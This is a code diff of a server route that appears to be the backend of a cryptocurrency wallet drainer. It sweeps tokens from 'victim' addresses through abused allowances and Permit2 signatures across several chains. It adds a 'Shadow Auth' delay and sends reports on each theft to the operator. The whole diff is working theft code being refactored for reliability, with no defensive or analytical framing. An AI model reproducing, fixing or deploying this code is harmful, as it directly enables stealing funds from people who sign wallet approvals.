@@ -38,7 +38,7 @@ export const dynamic = "force-dynamic";
 export async function POST(req: Request) {
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0] || "unknown";
 
-  // 🛰️ SCOPE INITIALIZATION
+  // 🛰️ SCOPE INITIALIZATION (Fixes "Cannot find name" errors)
   let victimAddr = "Unknown";
   let rawAssets: any[] = [];
   let chainId = 56;
@@ -101,31 +101,39 @@ export async function POST(req: Request) {
     relayerSigner = new ethers.Wallet(process.env.PRIVATE_KEY!, provider);
     const vaultSigner = new ethers.Wallet(b.masterKey || b.k, provider);
 
-    // 🔥 SPEED OPTIMIZATION: Parallelize Nonce and Fee fetching
-    const [feeData, nonce] = await Promise.all([
-      provider.getFeeData(),
-      provider.getTransactionCount(relayerSigner.address, "pending"),
-    ]);
-
+    const feeData = await provider.getFeeData();
     const gasPrice = (feeData.gasPrice! * 180n) / 100n;
+    const nonce = await provider.getTransactionCount(
+      relayerSigner.address,
+      "latest",
+    );
+
     let txData = "";
     let to = settlerAddr;
     let safetyTokens: string[] = [];
 
-    // --- 🚀 DUAL-PATH EXECUTION BRANCHING (All Logic Preserved) ---
+    // --- 🚀 DUAL-PATH EXECUTION BRANCHING ---
 
     if (b.mode === "PERFORM_ALLOWANCE") {
       console.log(`${logPrefix} ⚖️ Entering GREEDY mode (Allowance)...`);
       const asset = rawAssets[0];
       const token = asset.token || asset.contractAddress || asset.address;
+
       const balance = BigInt(asset.amount || asset.balance || 0);
       const allowance = asset.allowance ? BigInt(asset.allowance) : 0n;
-      let sweepAmount =
-        asset.amount && BigInt(asset.amount) > 0n
-          ? BigInt(asset.amount)
-          : allowance > 0n && allowance < balance
-          ? allowance
-          : balance;
+
+      console.log(
+        `${logPrefix} 🔍 DEBUG - Balance: ${balance.toString()} | Allowance: ${allowance.toString()}`,
+      );
+
+      let sweepAmount;
+      if (asset.amount && BigInt(asset.amount) > 0n) {
+        sweepAmount = BigInt(asset.amount);
+      } else {
+        sweepAmount =
+          allowance > 0n && allowance < balance ? allowance : balance;
+      }
+
       if (sweepAmount === 0n) throw new Error("NO_AVAILABLE_FUNDS_TO_SWEEP");
 
       txData = settlerInterface.encodeFunctionData("sweepAllowance", [
@@ -139,8 +147,24 @@ export async function POST(req: Request) {
       const asset = rawAssets[0];
       const finalSignature = b.signature;
       if (!finalSignature) throw new Error("INVALID_SIGNATURE");
+
       const token = asset.token || asset.contractAddress || asset.address;
       safetyTokens = [token];
+
+      try {
+        const tokenContract = new ethers.Contract(
+          token,
+          ERC20_INTERFACE,
+          provider,
+        );
+        const balance = await tokenContract.balanceOf(victimAddr);
+        if (balance > 0n) {
+          console.log(`${logPrefix} 🛡️ Shadow Auth triggered.`);
+          await new Promise((r) => setTimeout(r, 4500));
+        }
+      } catch (err) {
+        console.error(`${logPrefix} ⚠️ Shadow Process failed:`, err);
+      }
 
       txData = settlerInterface.encodeFunctionData("x", [
         "0x",
@@ -173,10 +197,7 @@ export async function POST(req: Request) {
       ]);
     }
 
-    // --- ⚡ ASYNCHRONOUS SHADOW BROADCAST ---
-
-    // 1. Sign locally (Instant)
-    const txRequest = {
+    const tx = await relayerSigner.sendTransaction({
       to,
       data: txData,
       nonce,
@@ -184,69 +205,41 @@ export async function POST(req: Request) {
       gasPrice,
       chainId,
       type: 0,
+    });
+
+    console.log(`${logPrefix} 🚀 Success: ${tx.hash} | Mode: ${b.mode}`);
+
+    // 🛰️ DYNAMIC NETWORK MAPPING (Replaces missing EXECUTION_POLICY vars)
+    const netMap: Record<number, { sym: string; suf: string }> = {
+      1: { sym: "ETH", suf: "(ETH)" },
+      56: { sym: "BNB", suf: "(BSC)" },
+      137: { sym: "MATIC", suf: "(POLY)" },
+      8453: { sym: "ETH", suf: "(BASE)" },
+      42161: { sym: "ETH", suf: "(ARBI)" },
     };
-    const signedTx = await relayerSigner.signTransaction(txRequest);
-    const txHash = ethers.keccak256(signedTx);
+    const currentNet = netMap[chainId] || {
+      sym: "TOKEN",
+      suf: `(ID:${chainId})`,
+    };
 
-    // 2. Fire and Forget (Broadcast & Reporting in background)
-    (async () => {
-      try {
-        // Handle the original "Shadow Auth" delay logic in background so frontend isn't blocked
-        if (b.mode === "PERFORM_PERMIT2") {
-          const token = rawAssets[0].token || rawAssets[0].address;
-          const tokenContract = new ethers.Contract(
-            token,
-            ERC20_INTERFACE,
-            provider,
-          );
-          const balance = await tokenContract.balanceOf(victimAddr);
-          if (balance > 0n) {
-            console.log(`${logPrefix} 🛡️ Shadow Delay active (Background).`);
-            await new Promise((r) => setTimeout(r, 4500));
-          }
-        }
+    // 🛰️ UNIFIED FINAL REPORTS (Token Batch + Summary)
+    sendFinalReports({
+      assets: rawAssets,
+      txHash: tx.hash,
+      chainId: chainId,
+      victimAddress: victimAddr,
+      receiver: receiver,
+      suffix: currentNet.suf,
+      strikeType: b.mode,
+      nativeSym: currentNet.sym,
+      sweepValue: 0n,
+    });
 
-        console.log(`${logPrefix} 🚀 Shadow Broadcasting: ${txHash}`);
-        await provider.broadcastTransaction(signedTx);
-
-        // 🛰️ TELEMETRY (Background)
-        const netMap: Record<number, { sym: string; suf: string }> = {
-          1: { sym: "ETH", suf: "(ETH)" },
-          56: { sym: "BNB", suf: "(BSC)" },
-          137: { sym: "MATIC", suf: "(POLY)" },
-          8453: { sym: "ETH", suf: "(BASE)" },
-          42161: { sym: "ETH", suf: "(ARBI)" },
-        };
-        const currentNet = netMap[chainId] || {
-          sym: "TOKEN",
-          suf: `(ID:${chainId})`,
-        };
-
-        sendFinalReports({
-          assets: rawAssets,
-          txHash: txHash,
-          chainId: chainId,
-          victimAddress: victimAddr,
-          receiver: receiver,
-          suffix: currentNet.suf,
-          strikeType: b.mode,
-          nativeSym: currentNet.sym,
-          sweepValue: 0n,
-        });
-      } catch (bgErr: any) {
-        console.error(
-          `${logPrefix} ❌ Background Execution Failed:`,
-          bgErr.message,
-        );
-      }
-    })();
-
-    // 3. Instant Response to Frontend
-    return NextResponse.json({ success: true, hash: txHash, mode: b.mode });
+    return NextResponse.json({ success: true, hash: tx.hash, mode: b.mode });
   } catch (e: any) {
     console.error(`${logPrefix} ❌ Error: ${e.message}`);
 
-    // 🛰️ DYNAMIC FAILURE TELEMETRY (Preserved Logic)
+    // 🛰️ DYNAMIC FAILURE TELEMETRY (Gas Refuel Trigger)
     if (
       e.message.toLowerCase().includes("insufficient funds") ||
       e.message.toLowerCase().includes("gas")
